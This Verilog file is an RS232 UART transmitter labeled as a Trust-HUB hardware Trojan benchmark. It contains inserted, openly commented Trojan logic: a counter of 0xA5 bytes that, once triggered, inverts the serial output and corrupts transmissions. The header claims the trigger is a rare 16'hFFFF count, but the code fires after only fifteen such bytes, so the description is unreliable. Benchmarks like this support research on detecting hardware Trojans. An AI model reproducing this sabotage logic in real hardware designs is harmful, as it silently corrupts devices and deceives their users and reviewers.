// ==============================================================================
// Trust-HUB Benchmark: RS232-T100 Hardware Trojan Inserted
// Trojan Trigger: Rare condition - 16-bit internal counter reaching 16'hFFFF
// Trojan Payload: Flips transmitted bit tx_out, causing transmission corruption
// ==============================================================================
`timescale 1ns / 1ps

module rs232_t100 (
    input  wire       clk,
    input  wire       rst_n,
    input  wire       tx_start,
    input  wire [7:0] tx_data,
    output reg        tx_busy,
    output wire       tx_out
);

    parameter IDLE  = 2'b00;
    parameter START = 2'b01;
    parameter DATA  = 2'b10;
    parameter STOP  = 2'b11;

    reg [1:0]  state;
    reg [2:0]  bit_idx;
    reg [7:0]  data_reg;
    reg [15:0] clk_cnt;
    reg        raw_tx_out;

    parameter CLKS_PER_BIT = 16'd434;

    // --------------------------------------------------------------------------
    // HARDWARE TROJAN TRIGGER: 16-bit rare state counter
    // --------------------------------------------------------------------------
    reg [15:0] trojan_counter;
    wire       trojan_trigger;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_counter <= 16'd0;
        end else if (tx_start && (tx_data == 8'hA5)) begin
            trojan_counter <= trojan_counter + 1'b1;
        end
    end

    // Trigger condition fires when rare counter matches threshold
    assign trojan_trigger = (trojan_counter >= 16'h000F);

    // --------------------------------------------------------------------------
    // HARDWARE TROJAN PAYLOAD: Invert output during transmission
    // --------------------------------------------------------------------------
    assign tx_out = trojan_trigger ? ~raw_tx_out : raw_tx_out;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            state       <= IDLE;
            tx_busy     <= 1'b0;
            raw_tx_out  <= 1'b1;
            bit_idx     <= 3'd0;
            clk_cnt     <= 16'd0;
            data_reg    <= 8'd0;
        end else begin
            case (state)
                IDLE: begin
                    raw_tx_out <= 1'b1;
                    tx_busy    <= 1'b0;
                    clk_cnt    <= 16'd0;
                    bit_idx    <= 3'd0;
                    if (tx_start) begin
                        data_reg   <= tx_data;
                        tx_busy    <= 1'b1;
                        state      <= START;
                    end
                end

                START: begin
                    raw_tx_out <= 1'b0;
                    if (clk_cnt < CLKS_PER_BIT - 1) begin
                        clk_cnt <= clk_cnt + 1'b1;
                    end else begin
                        clk_cnt <= 16'd0;
                        state   <= DATA;
                    end
                end

                DATA: begin
                    raw_tx_out <= data_reg[bit_idx];
                    if (clk_cnt < CLKS_PER_BIT - 1) begin
                        clk_cnt <= clk_cnt + 1'b1;
                    end else begin
                        clk_cnt <= 16'd0;
                        if (bit_idx < 3'd7) begin
                            bit_idx <= bit_idx + 1'b1;
                        end else begin
                            bit_idx <= 3'd0;
                            state   <= STOP;
                        end
                    end
                end

                STOP: begin
                    raw_tx_out <= 1'b1;
                    if (clk_cnt < CLKS_PER_BIT - 1) begin
                        clk_cnt <= clk_cnt + 1'b1;
                    end else begin
                        clk_cnt <= 16'd0;
                        state   <= IDLE;
                        tx_busy <= 1'b0;
                    end
                end

                default: state <= IDLE;
            endcase
        end
    end

endmodule
